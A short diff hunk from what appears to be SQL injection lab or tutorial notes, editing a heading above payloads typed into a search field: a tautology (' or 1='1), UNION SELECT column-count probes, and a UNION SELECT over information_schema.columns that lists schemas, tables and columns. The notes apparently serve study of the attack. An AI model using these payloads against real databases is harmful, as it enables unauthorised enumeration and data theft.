@@ -37,7 +37,7 @@ ________________________________________________________________________________
     Audi ' or 1='1
 
 ### 2-Modify Goldent Statement to include all information.
-#### UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #
+#### UNION SELECT table_schema,table_name,column_name FROM information_schema.columns
     Audi ' UNION SELECT 1,2,3,4 #
     Audi ' UNION SELECT 1,2,3,4,5 #
     Audi ' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #
